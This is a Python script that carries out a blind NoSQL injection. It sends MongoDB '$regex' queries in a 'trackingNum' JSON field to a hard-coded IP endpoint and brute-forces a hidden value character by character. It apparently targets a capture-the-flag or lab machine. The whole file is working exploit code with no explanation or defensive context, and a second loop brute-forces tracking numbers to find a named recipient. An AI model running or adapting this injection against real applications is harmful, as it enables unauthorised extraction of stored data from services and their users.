import requests
import string
import os,sys,re

##
##

base_url = "http://83.136.250.104:43506/index.php"
headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-type": "application/json",
    "Origin": "http://94.237.63.93:31072",
    "Connection": "close",
    "Referer": "http://94.237.63.93:31072/",
}

# Assume you found the first character as '3'
found_characters = ['']

# Continue iterating until no match is found or the desired length is reached
while True:
    current_character = None

    # Iterating through uppercase letters A-Z and digits 0-9 for each character in the tracking number
    for char in '{}' + string.ascii_uppercase + string.ascii_lowercase + string.digits:
        tracking_number = ''.join(found_characters + [char])
        data = {"trackingNum": {"$regex": f"^{tracking_number}.*"}}
        response = requests.post(base_url, headers=headers, json=data)

        print(f"Trying tracking number: {tracking_number}")
        if "bmdyy" in response.text:
            print(f"Match found! Next character: {char}")
            
            ## Extract content inside curly braces using regex
            ## match = re.search(r'\{(.+?)\}', response.text)
            
            current_character = char
            break
        else:
            print("No match.")
        print("-" * 30)

    if current_character is not None:
        found_characters.append(current_character)
    else:
        print("No match found or reached end of possibilities.")
        break

print("Final tracking number:", ''.join(found_characters))

##
##

##
##

# Assuming the tracking number format is "UPSxxxAXXXXX" where X is the variable character

##
##

for i in range(10):  # Iterating through digits 0-9 for the variable character
    for letter in string.ascii_uppercase:  # Iterating through uppercase letters A-Z for the variable character
        tracking_number = f"UPS###{i:05d}{letter}"
        data = {"trackingNum": {"$regex": f"^{tracking_number}.*"}}
        response = requests.post(base_url, headers=headers, json=data)

        print(f"Trying tracking number: {tracking_number}")
        if "Recipient:          Franz Pflaumenbaum" in response.text:
            print("Match found!")
            print(response.text)
            break
        else:
            print("No match.")
        print("-" * 30)
        
